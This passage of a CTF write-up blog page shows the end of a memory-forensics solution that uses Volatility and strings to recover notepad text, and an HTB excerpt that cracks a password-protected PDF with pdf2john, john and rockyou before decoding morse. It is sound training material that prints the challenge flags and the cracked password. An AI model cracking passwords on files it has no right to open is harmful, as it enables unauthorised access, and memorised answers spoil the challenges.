+<h2 id="Question-13"><a href="#Question-13" class="headerlink" title="Question 13"></a>Question 13</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What was written <span class="keyword">in</span> notepad.exe <span class="keyword">in</span> the time of the memory dump?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -<span class="keyword">f</span> memory.mem --<span class="keyword">profile</span>=Win7SP1x64 memdump -<span class="keyword">p</span> <span class="number">3032</span> --dump-dir .</span><br><span class="line">kali Desktop/forensic_images » strings -<span class="keyword">e</span> <span class="keyword">l</span> <span class="number">3032</span>.dmp | <span class="keyword">grep</span> <span class="string">&quot;flag&lt;&quot;</span></span><br><span class="line">flag<span class="symbol">&lt;REDBULL_IS_LIFE&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;Th&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;Th&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;TheK&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;TheK&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The solution is straight forward, get the notepad memory dump and grep for the flag</p>
+<h2 id="Question-14"><a href="#Question-14" class="headerlink" title="Question 14"></a>Question 14</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">What <span class="keyword">is</span> <span class="keyword">the</span> shortname <span class="keyword">of</span> <span class="keyword">the</span> <span class="built_in">file</span> <span class="keyword">at</span> <span class="built_in">file</span> <span class="built_in">record</span> <span class="number">59045</span>?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> <span class="keyword">the</span> – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> <span class="keyword">the</span> xyx.</span><br></pre></td></tr></table></figure>
+
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/CTF/">CTF</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/forensic/">forensic</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/08/22/Defcon-DFIR-memory_forensic/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/08/15/Challenge-G0ld/">HTB::Challenge [Misc] G0ld</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Aug 15, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/gold/image-20200815132255084.png" alt="image-20200815132255084"></p>
+<p>After extracted the file </p>
+<p><img src="/images/gold/image-20200815132422801.png" alt="image-20200815132422801"></p>
+<p>The pdf file is password protected.</p>
+<p>Search for pdf2john</p>
+<p><img src="/images/gold/image-20200815132545541.png" alt="image-20200815132545541"></p>
+<p>and we created the hash for john to cracked it.</p>
+<p>By using the rockyou dictionary, we are able to get the password </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=&lt;rockyou.txt&gt; &lt;pdf_hash&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/gold/image-20200815132649389.png" alt="image-20200815132649389"></p>
+<p>we got the password <em>jumanji69</em></p>
+<p>after open the pdf, found morse code</p>
+<p><img src="/images/gold/image-20200815132749285.png" alt="image-20200815132749285"></p>
+<p>copy it and decode online </p>
+<p>we got the flag</p>
+<p><img src="/images/gold/image-20200815132829275.png" alt="image-20200815132829275"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a>           
+		            
+				<a class="link" href="/categories/hackthebox-challenge/misc/">misc</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/08/15/Challenge-G0ld/">Continue</a> 	
 	</div>	
     
 </article>
